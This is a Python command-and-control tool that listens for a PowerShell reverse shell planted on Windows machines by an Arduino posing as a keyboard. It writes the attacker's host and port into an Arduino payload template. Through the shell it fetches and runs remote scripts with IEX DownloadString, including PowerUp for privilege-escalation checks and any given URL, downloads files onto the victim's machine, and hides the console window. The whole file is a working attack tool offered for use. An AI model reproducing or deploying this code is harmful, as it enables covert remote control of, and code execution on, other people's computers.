#!/bin/python3
__author__  = "0x539"
__website__ = "0x539.co"
import sys, os, argparse
from pwn import *


parser = argparse.ArgumentParser(description="0x539 tool.\nA tool to connect to thepowershell reversed shell from arduino mini pro.")
parser.add_argument(
                "--debug",
                        required=False,
                                help='Error that oracle give us example: 404,500,200 OR in the dom example: "<h2>Padding Error<h2>"',
                )
parser.add_argument("--lport", required=True, help="port example: 4444")
parser.add_argument("--lhost", required=True, help="host example: attackerwebsite.com (or an ip 198.23.44.132)")
parser.add_argument("--keyboard", required=True, help="keyboard example: azerty (or qwerty)")
args = parser.parse_args()
if not args.lport.isnumeric():
    if not (int(args.lport) <= 65536):
        print("[-] Invalid LPORT")
        exit()
def parse_keyboard(string):
    allstr = "qbcdefghijkl;noparstuvzxyw abcdefghijklmnopqrstuvwxyz".split(" ")
    aldict = dict(zip(allstr[0].split(), allstr[1].split()))
    news = ""
    if args.keyboard == "azerty":
        string = string.replace(".", "\\x85,").lower()
        news1 = string.replace("-", "\\xFF\\x36\\xFF")
        for i in news1:
            if i in allstr:
                news += aldict[i]
            else:
                news += i
    else:
        news = string
    return news




if args.keyboard in ["azerty", "qwerty"]:
    with open(f"exploits/arduino_{args.keyboard}.c", "r") as f:
        with open(f"arduino_{args.keyboard}.c", "w") as nf:
            print(f"[+] Creating file: arduino_{args.keyboard}.c")
            nf.write(f.read().replace("<[LHOST]>", parse_keyboard(args.lhost)).replace("<[LPORT]>", args.lport))
            print("[+] File created check it on the current path")
            nf.close()
        f.close()


PORT = args.lport

print("[+] Listening..")
l = listen(PORT)
s = l.wait_for_connection()

p = print
def print(*d, **j):
    j["end"] = ""
    return p(*d, **j)
def recv_a(s):
    amount = 1024
    data = s.recv(amount, timeout=30)
    container = data
    while len(data) >= amount:
        data = s.recv(amount, timeout=30)
        container += data
    return container
 
def send_multiple_lines(s, script):
    for line in script.split("\n"):
        s.send(line.strip())
        recv_a(s)
    return

def reconnect():
    s = l.wait_for_connection()
    return s

def enumerate_0(s):
    p("[+] This process might take a while, DO NOT INTERRUPT IT!\n[+] type yes to proceed.")
    resp = input("you agree(yes/no)? ")
    if resp.strip() != "yes":
        print("[+] Abort!")
        return
    data = """IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
Invoke-AllChecks"""
    s.send(data)
    print(recv_a(s))

def execute_url(s, link):
    p("[+] This process might take a while, DO NOT INTERRUPT IT!\n[+] type yes to proceed.")
    resp = input("you agree(yes/no)? ")
    if resp.strip() != "yes":
        print("[+] Abort!")
        return
    data = f"""IEX (New-Object Net.WebClient).DownloadString('{link}')
Invoke-AllChecks"""
    s.send(data)
    print(recv_a(s))


def download_file(s, link, filename):
    d = "cd %HOMEPATH%\n$url = \"" + link + '''\"
    $output = \"'''+filename + """\"
    $start_time = Get-Date
    Invoke-WebRequest -Method Get -Uri $url -OutFile $output
    Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\"\ncd ..\.. """
    s.send(d)
    print(recv_a(s))
    p("\x1b[1;36m[+]\x1b[0m File downloaded.")

def hide_cmd(s):
    klm = """Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'"""
    gWindow = "$consolePtr = [Console.Window]::GetConsoleWindow()"
    hideWindow = "[Console.Window]::ShowWindow($consolePtr, 0)"
    s.send(klm)
    recv_a(s)
    s.send(gWindow)
    recv_a(s)
    s.send(hideWindow)
    recv_a(s)


def connect_ps(s):
    s.send("whoami")
    data = recv_a(s)
    print("[+] press Ctrl+C to quit powershell.\n\x1b[1;42m[+]\x1b[0m connected to ", data.decode())
    try:
        while 1:
            carried = input("")
            s.send(carried)
            data = recv_a(s)
            print(data.decode())
    except KeyboardInterrupt:
        p("\n[+] Detaching powershell")
        return


def menu():
    p("""
      ___   ___   ___  _____   ____     ___   
     / _ \  \  \ /  / | ____| |___ \   / _ \  
    | | | |  \  V  /  | |__     __) | | (_) | 
    | | | |   >   <   |___ \   |__ <   \__, | 
    | |_| |  /  .  \   ___) |  ___) |    / /  
     \___/  /__/ \__\ |____/  |____/    /_/   

     Tool.
     """)
def help_0():
    p("""
commands:
    ps              connect to powershell
    upload          download file
    enumerate       enumerate windows vulnerabilities
    urlexec         execute a powershell script from a link
    help            open this help menu
    exit            quit this tool
""")

def shell(s):
    menu()
    while 1:
        cmd = input("!0x53O> ")
        if cmd.strip() == "exit":
            p("\x1b[1;36m[+]\x1b[0m Exiting..")
            sleep(2)
            sys.exit()
        elif cmd.strip() in ["ps", "powershell"]:
            print("\x1b[1;36m[+]\x1b[0m Attaching powershell")
            connect_ps(s)
        elif cmd.strip() == "help":
            menu()
            help_0()
            continue
        elif cmd.strip() in ["enum", "enumerate"]:
            enumerate_0(s)
        elif len(cmd.split(" ")) > 1:
            cmd = cmd.split(" ")
            if cmd[0].strip() == "upload":
                if len(cmd) == 3:
                    download_file(s, cmd[1].strip(), cmd[2].strip())
                    continue
                p("Usuage:\n\rupload <link> <filename>")
            elif cmd[0].strip() == "urlexec":
                if len(cmd) == 2:
                    execute_url(s, cmd[1].strip())
                    continue
                p("Usuage:\n\rurlexec <pslink>")
        elif cmd.strip() == "reconnect":
            s = reconnect()

        elif cmd.strip() == "":
            continue
        
        p("\x1b[1;31m[-]\x1b[0m Command does not exist")
if __name__ == "__main__":
    if not args.debug:
        hide_cmd(s)
    shell(s)